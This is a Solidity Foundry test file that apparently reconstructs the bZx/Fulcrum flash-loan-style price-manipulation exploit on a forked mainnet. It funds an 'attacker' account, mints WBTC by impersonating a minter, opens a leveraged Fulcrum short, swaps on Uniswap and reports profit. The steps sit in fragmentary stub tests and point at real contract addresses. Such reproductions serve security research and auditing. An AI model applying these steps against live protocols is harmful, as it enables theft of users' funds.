// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity >0.7.0;

import "ds-test/test.sol";
import {stdCheats} from "forge-std/stdlib.sol";
import {Vm} from "forge-std/Vm.sol";
import {Strings} from "mylib/StringCon.sol";
import "../interfaces/bZx1I.sol";

contract bZx1 is DSTest, stdCheats {
    Vm public constant vm = Vm(HEVM_ADDRESS);
    address payable attacker;
    address payable FulcrumsETHwBTC5xAddress = payable(0xb0200B0677dD825bb32B93d055eBb9dc3521db9D);
    FulcrumShort private FulcrumsETHwBTC = FulcrumShort(FulcrumsETHwBTC5xAddress);
    address private UniswapWBTCAddress = 0x4d2f5cFbA55AE412221182D8475bC85799A5644b;
    UniswapExchangeInterface private exchange = UniswapExchangeInterface(UniswapWBTCAddress);

    IWBTC WBTC = IWBTC(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    function setUp() public {
        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.deal(attacker, 4500 ether);

        vm.deal(address(this), 4500 ether);
        vm.startPrank(0xCA06411bd7a7296d7dbdd0050DFc846E95fEBEB7);
        WBTC.mint(address(attacker), 112 * 10 ** 8);
        vm.stopPrank();

        vm.startPrank(attacker);
        WBTC.approve(UniswapWBTCAddress, type(uint256).max);
        address cWBTCAddress = 0xC11b1268C1A384e55C48c2391d8d480264A3A7F4;
        WBTC.approve(cWBTCAddress, type(uint256).max);
    }

    function profitSummary() internal returns (string memory _uintAsString) {
        uint256 balance1 = address(attacker).balance / 1e18; // ETH earned
        uint256 balance2 = WBTC.balanceOf(address(attacker)) / 1e8; // WBTC spent
        return Strings.appendWithSpace(balance1, balance2);
    }

    function testExample2_() public {
        revert(profitSummary());
    }

    function testExample3_() public {
        vm.stopPrank();
        vm.startPrank(address(this));
        // Action: MarginShort
        FulcrumsETHwBTC.mintWithEther{value: 1 ether}(address(this), 0);
        vm.stopPrank();
        vm.startPrank(attacker);
    }

    function testExample0_() public {
        // Action: MarginShort
        FulcrumsETHwBTC.mintWithEther{value: 1 ether}(address(this), 0);
    }

    function testExample1_() public {
        // Action: SwapUniswapWBTC2ETH
        exchange.tokenToEthSwapInput(10 * 10 ** 8, 1, 0xffffffff);
    }
}
